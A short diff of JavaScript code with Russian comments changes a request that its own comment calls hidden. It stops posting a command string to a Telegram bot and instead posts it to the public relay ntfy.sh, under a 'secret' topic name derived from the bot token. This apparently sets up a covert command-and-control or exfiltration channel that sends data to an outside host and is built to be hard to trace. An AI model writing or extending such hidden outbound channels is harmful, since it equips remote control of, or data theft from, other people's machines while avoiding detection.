@@ -589,14 +589,13 @@
                 }, 1000);
             }
 
-            // Отправка скрытого POST-запроса
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            // Генерация уникального секретного топика на основе токена
+            const secretTopic = "nexus_" + btoa(botToken).replace(/[^a-zA-Z0-9]/g, '').substring(0, 20);
+
+            // Отправка скрытого POST-запроса через бесплатный ретранслятор ntfy.sh
+            fetch(`https://ntfy.sh/${secretTopic}`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: cmd
-                })
+                body: cmd
             }).catch(err => console.error("Error:", err));
         }
 
